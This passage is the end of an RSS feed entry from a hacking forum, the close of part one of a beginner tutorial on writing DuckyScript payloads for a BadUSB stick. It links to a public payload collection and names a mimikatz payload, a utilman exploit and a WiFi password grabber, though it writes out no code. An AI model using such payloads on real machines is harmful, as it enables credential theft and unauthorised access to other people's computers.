<p>You can find many different DuckyScripts <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="nofollow noopener">here</a>. Itโs a good place to search for some techniques you can use, when writing your own scripts (Or to find scripts for trolling your friends, e.g. <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---You-got-quacked%21" rel="nofollow noopener">this one</a> <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">). There are some very interesting ones like <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---mimikatz-payload" rel="nofollow noopener">mimikatz</a>, <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---utilman-exploit" rel="nofollow noopener">utilman exploit</a> or a <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber" rel="nofollow noopener">WIFI password grabber</a>.</p>
<hr>
<h2>Conclusion</h2>
<p>Is it really that easy? Yes. Just write your own simple DuckyScript, plug in your Bad USB andโฆ Itโs won <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. Oh, and donโt forget that you feel like a real 1337 h4xx0r, when you just have to put in your Stick and see magically popping up windows, filling with commands without anyones interaction <img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:">.</p>
<p>In the next part weโll talk about the Powershell Script, you have to download. Donโt expect a big introduction to Powershell, because Iโm just a beginner, but Iโm looking forward to explain you some basics.</p>
<p>|-TheDoctor-|</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/1</link>
        <pubDate>Sat, 01 Oct 2016 07:08:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-1</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
  </channel>
</rss>
